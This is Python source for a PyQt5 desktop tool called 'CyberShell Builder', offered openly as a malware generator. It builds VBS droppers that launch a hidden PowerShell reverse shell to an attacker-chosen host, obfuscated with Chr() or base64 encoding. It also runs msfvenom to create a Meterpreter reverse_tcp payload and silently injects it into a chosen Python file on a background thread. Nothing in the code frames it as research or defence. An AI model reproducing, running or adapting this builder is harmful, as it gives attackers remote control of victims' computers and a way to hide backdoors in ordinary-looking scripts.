import os
import random
import string
import subprocess
import re
import base64
import threading
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                             QLineEdit, QPushButton, QTextEdit, QTabWidget, QFileDialog, QMessageBox)
from PyQt5.QtCore import Qt, QSize, QPropertyAnimation, QEasingCurve
from PyQt5.QtGui import QFont, QColor, QPalette, QIcon

class CyberpunkButton(QPushButton):
    def __init__(self, text, color):
        super().__init__(text)
        self.color = color
        self.setFixedHeight(40)
        self.setStyleSheet(f"""
            QPushButton {{
                background-color: transparent;
                color: {self.color};
                border: 2px solid {self.color};
                border-radius: 5px;
                font-family: 'Consolas';
                font-size: 12px;
                padding: 5px;
            }}
            QPushButton:hover {{
                background-color: {self.color};
                color: #0a0a12;
            }}
            QPushButton:pressed {{
                background-color: #0a0a12;
                color: {self.color};
            }}
        """)
        self.setCursor(Qt.PointingHandCursor)

class CyberpunkLineEdit(QLineEdit):
    def __init__(self):
        super().__init__()
        self.setStyleSheet("""
            QLineEdit {
                background-color: #0a0a12;
                color: #00ff9d;
                border: 1px solid #5e00ff;
                border-radius: 3px;
                padding: 5px;
                font-family: 'Consolas';
                font-size: 12px;
            }
        """)

class CyberpunkTextEdit(QTextEdit):
    def __init__(self):
        super().__init__()
        self.setStyleSheet("""
            QTextEdit {
                background-color: #0a0a12;
                color: #00ff9d;
                border: 1px solid #5e00ff;
                border-radius: 3px;
                padding: 5px;
                font-family: 'Consolas';
                font-size: 12px;
            }
        """)
        self.setReadOnly(True)

class CyberpunkLabel(QLabel):
    def __init__(self, text):
        super().__init__(text)
        self.setStyleSheet("""
            QLabel {
                color: #00b4ff;
                font-family: 'Consolas';
                font-size: 12px;
            }
        """)

class ReverseShellBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CyberShell Builder - EmperorYetiandi")
        self.setWindowIcon(QIcon.fromTheme("terminal"))
        self.setFixedSize(800, 600)
        self.setup_ui()
        self.setup_styles()

    def setup_styles(self):
        self.setStyleSheet("""
            QMainWindow {
                background-color: #0a0a12;
            }
            QTabWidget::pane {
                border: 1px solid #5e00ff;
                border-radius: 3px;
                background-color: #0a0a12;
            }
            QTabBar::tab {
                background-color: #0a0a12;
                color: #00b4ff;
                border: 1px solid #5e00ff;
                padding: 8px;
                font-family: 'Consolas';
                font-size: 12px;
            }
            QTabBar::tab:selected {
                background-color: #5e00ff;
                color: #0a0a12;
            }
        """)

    def setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(15)

        title_label = QLabel("CYBERSHELL BUILDER")
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("""
            QLabel {
                color: #00ff9d;
                font-family: 'Consolas';
                font-size: 24px;
                font-weight: bold;
                padding-bottom: 15px;
            }
        """)
        main_layout.addWidget(title_label)

        credit_label = QLabel()
        credit_label.setAlignment(Qt.AlignCenter)
        credit_label.setText("""
            <span style="
                font-family: Consolas;
                font-size: 13px;
                font-weight: bold;
                background: -webkit-linear-gradient(45deg, #00b4ff, #00ff9d);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                display: inline-block;
                padding-bottom: 10px;
            ">
             Author: KaisarYetiandi | Support: github.com/KaisarYetiandi
            </span>
        """)
        credit_label.setTextFormat(Qt.RichText)
        credit_label.setTextInteractionFlags(Qt.TextSelectableByMouse)
        main_layout.addWidget(credit_label)

        self.tab_widget = QTabWidget()
        main_layout.addWidget(self.tab_widget)
        self.setup_vbs_tab()
        self.setup_injector_tab()


        
    def setup_vbs_tab(self):
        vbs_tab = QWidget()
        layout = QVBoxLayout(vbs_tab)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)
        
        ip_layout = QHBoxLayout()
        ip_label = CyberpunkLabel("Target IP/Domain:")
        self.ip_input = CyberpunkLineEdit()
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_input)
        layout.addLayout(ip_layout)
        
        port_layout = QHBoxLayout()
        port_label = CyberpunkLabel("Target Port:")
        self.port_input = CyberpunkLineEdit()
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.port_input)
        layout.addLayout(port_layout)
        
        file_layout = QHBoxLayout()
        file_label = CyberpunkLabel("Output VBS File:")
        self.file_input = CyberpunkLineEdit()
        browse_btn = CyberpunkButton("Browse", "#5e00ff")
        browse_btn.clicked.connect(self.browse_vbs_file)
        file_layout.addWidget(file_label)
        file_layout.addWidget(self.file_input)
        file_layout.addWidget(browse_btn)
        layout.addLayout(file_layout)
        
        button_layout = QHBoxLayout()
        chr_btn = CyberpunkButton("Generate CHR Method", "#00ff9d")
        chr_btn.clicked.connect(self.generate_chr_method)
        b64_btn = CyberpunkButton("Generate Base64 Method", "#00b4ff")
        b64_btn.clicked.connect(self.generate_b64_method)
        button_layout.addWidget(chr_btn)
        button_layout.addWidget(b64_btn)
        layout.addLayout(button_layout)
        
        self.vbs_output = CyberpunkTextEdit()
        layout.addWidget(self.vbs_output)
        self.tab_widget.addTab(vbs_tab, "VBS Builder")
        
    def setup_injector_tab(self):
        injector_tab = QWidget()
        layout = QVBoxLayout(injector_tab)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)
        
        file_layout = QHBoxLayout()
        file_label = CyberpunkLabel("Python File to Inject:")
        self.py_file_input = CyberpunkLineEdit()
        browse_btn = CyberpunkButton("Browse", "#5e00ff")
        browse_btn.clicked.connect(self.browse_py_file)
        file_layout.addWidget(file_label)
        file_layout.addWidget(self.py_file_input)
        file_layout.addWidget(browse_btn)
        layout.addLayout(file_layout)
        
        ip_layout = QHBoxLayout()
        ip_label = CyberpunkLabel("LHOST:")
        self.msf_ip_input = CyberpunkLineEdit()
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.msf_ip_input)
        layout.addLayout(ip_layout)
        
        port_layout = QHBoxLayout()
        port_label = CyberpunkLabel("LPORT:")
        self.msf_port_input = CyberpunkLineEdit()
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.msf_port_input)
        layout.addLayout(port_layout)
        
        inject_btn = CyberpunkButton("Inject Metasploit Payload", "#ff00aa")
        inject_btn.clicked.connect(self.inject_payload)
        layout.addWidget(inject_btn)
        
        self.injector_output = CyberpunkTextEdit()
        layout.addWidget(self.injector_output)
        self.tab_widget.addTab(injector_tab, "Python Injector")
        
    def browse_vbs_file(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save VBS File", "", "VBS Files (*.vbs)")
        if file_path:
            self.file_input.setText(file_path)
            
    def browse_py_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Python File", "", "Python Files (*.py)")
        if file_path:
            self.py_file_input.setText(file_path)
            
    def validate_ip_or_domain(self, value):
        ip_pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        domain_pattern = r"^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$"
        ngrok_pattern = r"^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}$"
        return (re.match(ip_pattern, value) or 
                re.match(domain_pattern, value) or 
                re.match(ngrok_pattern, value))
    
    def validate_port(self, port):
        return port.isdigit() and 1 <= int(port) <= 65535
    
    def powershell_reverse_shell(self, ip, port):
        return (
            f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            "$stream = $client.GetStream();"
            "$writer = New-Object System.IO.StreamWriter($stream);"
            "$buffer = New-Object System.Byte[] 1024;"
            "$encoding = New-Object System.Text.ASCIIEncoding;"
            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){"
            "$command = $encoding.GetString($buffer, 0, $read);"
            "$output = cmd.exe /c $command 2>&1 | Out-String;"
            "$writer.WriteLine($output);"
            "$writer.Flush()"
            "}"
        )
    
    def obfuscate_chr(self, text):
        return '""' + ''.join([f' & Chr({ord(c)})' for c in text])
    
    def generate_chr_method(self):
        ip = self.ip_input.text()
        port = self.port_input.text()
        filename = self.file_input.text()
        
        if not self.validate_ip_or_domain(ip):
            self.show_error("Invalid IP/Domain")
            return
        if not self.validate_port(port):
            self.show_error("Port must be 1-65535")
            return
        if not filename:
            self.show_error("Please specify output file")
            return
            
        try:
            pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)'
            obf_payload = self.obfuscate_chr(self.powershell_reverse_shell(ip, port))
            vbs = (
                'Set x = CreateObject("WScript.Shell")\n'
                f'x.Run {pwsh} & " -NoP -NonI -W Hidden -Command " & {obf_payload}, 0, False\n'
            )
            
            with open(filename, "w", newline="\r\n") as f:
                f.write(vbs)
                
            self.vbs_output.setPlainText(f"Successfully generated CHR method VBS:\n{filename}\n\n{vbs}")
            self.show_success("VBS file created successfully!")
        except Exception as e:
            self.show_error(f"Error: {str(e)}")
    
    def generate_b64_method(self):
        ip = self.ip_input.text()
        port = self.port_input.text()
        filename = self.file_input.text()
        
        if not self.validate_ip_or_domain(ip):
            self.show_error("Invalid IP/Domain")
            return
        if not self.validate_port(port):
            self.show_error("Port must be 1-65535")
            return
        if not filename:
            self.show_error("Please specify output file")
            return
            
        try:
            payload = self.powershell_reverse_shell(ip, port)
            encoded = base64.b64encode(payload.encode("utf-16le")).decode()
            vbs = (
                'Set shell = CreateObject("Wscript.Shell")\n'
                f'shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded}", 0, False\n'
            )
            
            with open(filename, 'w', newline='\r\n') as f:
                f.write(vbs)
                
            self.vbs_output.setPlainText(f"Successfully generated Base64 method VBS:\n{filename}\n\n{vbs}")
            self.show_success("VBS file created successfully!")
        except Exception as e:
            self.show_error(f"Error: {str(e)}")
    
    def inject_payload(self):
        py_file = self.py_file_input.text()
        lhost = self.msf_ip_input.text()
        lport = self.msf_port_input.text()
        
        if not os.path.isfile(py_file):
            self.show_error(f"File '{py_file}' not found")
            return
        if not self.validate_ip_or_domain(lhost):
            self.show_error("Invalid LHOST")
            return
        if not self.validate_port(lport):
            self.show_error("LPORT must be 1-65535")
            return
            
        try:
            self.injector_output.append("🔧 Creating Metasploit payload...")
            
            result = subprocess.run(
                ["msfvenom", "-p", "python/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            if result.returncode != 0:
                self.show_error(f"Failed to create payload:\n{result.stderr}")
                return
                
            msf_payload = result.stdout.strip().splitlines()
            
            with open(py_file, "r", encoding="utf-8") as f:
                original = f.read()
                
            fn_name = ''.join(random.choices(string.ascii_letters, k=8))
            payload_func = [f"def {fn_name}():\n"]
            for line in msf_payload:
                payload_func.append(f"    {line}\n")
            payload_func.append(f"\nthreading.Thread(target={fn_name}, daemon=True).start()\n\n")
            
            final_code = (
                "import threading\n" +
                ''.join(payload_func) +
                original
            )
            
            output_file = py_file.replace(".py", "_patched.py")
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(final_code)
                
            self.injector_output.append(f"✅ Payload successfully injected to '{output_file}'")
            self.injector_output.append("➡️ Run Metasploit listener: msfconsole -x \"use exploit/multi/handler ...\"")
            self.show_success("Payload injected successfully!")
        except Exception as e:
            self.show_error(f"Error: {str(e)}")
    
    def show_error(self, message):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Critical)
        msg.setText(message)
        msg.setWindowTitle("Error")
        msg.setStyleSheet("""
            QMessageBox {
                background-color: #0a0a12;
                color: #ff5555;
                font-family: 'Consolas';
            }
            QLabel {
                color: #ff5555;
            }
            QPushButton {
                background-color: #5e00ff;
                color: #0a0a12;
                border: none;
                padding: 5px 10px;
                font-family: 'Consolas';
            }
        """)
        msg.exec_()
    
    def show_success(self, message):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Information)
        msg.setText(message)
        msg.setWindowTitle("Success")
        msg.setStyleSheet("""
            QMessageBox {
                background-color: #0a0a12;
                color: #00ff9d;
                font-family: 'Consolas';
            }
            QLabel {
                color: #00ff9d;
            }
            QPushButton {
                background-color: #5e00ff;
                color: #0a0a12;
                border: none;
                padding: 5px 10px;
                font-family: 'Consolas';
            }
        """)
        msg.exec_()

if __name__ == "__main__":
    app = QApplication([])
    app.setStyle("Fusion")
    
    dark_palette = QPalette()
    dark_palette.setColor(QPalette.Window, QColor(10, 10, 18))
    dark_palette.setColor(QPalette.WindowText, QColor(0, 180, 255))
    dark_palette.setColor(QPalette.Base, QColor(10, 10, 18))
    dark_palette.setColor(QPalette.AlternateBase, QColor(20, 20, 30))
    dark_palette.setColor(QPalette.ToolTipBase, QColor(0, 255, 157))
    dark_palette.setColor(QPalette.ToolTipText, QColor(10, 10, 18))
    dark_palette.setColor(QPalette.Text, QColor(0, 255, 157))
    dark_palette.setColor(QPalette.Button, QColor(10, 10, 18))
    dark_palette.setColor(QPalette.ButtonText, QColor(0, 180, 255))
    dark_palette.setColor(QPalette.BrightText, QColor(255, 0, 170))
    dark_palette.setColor(QPalette.Highlight, QColor(94, 0, 255))
    dark_palette.setColor(QPalette.HighlightedText, QColor(10, 10, 18))
    app.setPalette(dark_palette)
    
    font = QFont("Consolas", 10)
    app.setFont(font)
    
    window = ReverseShellBuilder()
    window.show()
    app.exec_()
